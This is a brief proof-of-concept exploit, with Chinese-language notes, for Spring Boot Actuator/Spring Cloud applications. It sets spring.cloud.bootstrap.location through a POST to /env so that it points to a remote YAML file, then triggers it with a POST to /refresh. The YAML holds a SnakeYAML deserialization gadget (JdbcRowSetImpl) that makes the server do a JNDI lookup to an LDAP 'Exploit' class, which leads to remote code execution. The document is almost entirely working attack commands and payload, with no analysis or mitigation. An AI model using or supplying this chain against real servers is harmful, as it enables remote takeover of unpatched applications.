## PoC 
1. `curl -X POST localhost:8080/env -d "spring.cloud.bootstrap.location=http://localhost/jndi.yml"`
jndi.yml内容如下
```
foo: !!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: "ldap://localhost:389/Exploit"
  autoCommit: true
```
2. `curl -X POST localhost:8080/refresh`